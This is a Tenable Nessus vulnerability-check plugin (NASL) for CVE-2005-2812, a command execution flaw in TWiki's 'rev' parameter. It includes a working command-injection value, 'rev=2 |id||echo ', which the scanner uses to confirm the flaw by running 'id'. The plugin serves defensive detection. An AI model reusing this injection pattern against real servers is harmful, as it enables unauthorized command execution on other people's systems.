#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a CGI application that is prone to
arbitrary command execution. 

Description :

The installed version of TWiki allows an attacker, by manipulating
input to the 'rev' parameter, to execute arbitrary shell commands on
the remote host subject to the privileges of the web server user id. 

See also : 

http://twiki.org/cgi-bin/view/Codev/SecurityAlertExecuteCommandsWithRev

Solution : 

Apply the appropriate hotfix listed in the vendor advisory above.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19704);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-2812");
  script_bugtraq_id(14747);

  name["english"] = "TWiki rev Parameter Command Execution Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for rev parameter command execution vulnerability in TWiki";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("twiki_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/twiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  http_check_remote_code(
    unique_dir:dir,
    # nb: this exploit requires the topic have at least two revisions.
    check_request:string(
      "/view/Main/TWikiUsers?",
      "rev=2", urlencode(str:" |id||echo ")
    ),
    check_result:"uid=[0-9]+.*gid=[0-9]+.*",
    command:"id",
    description:desc["english"],
    port:port
  );
}
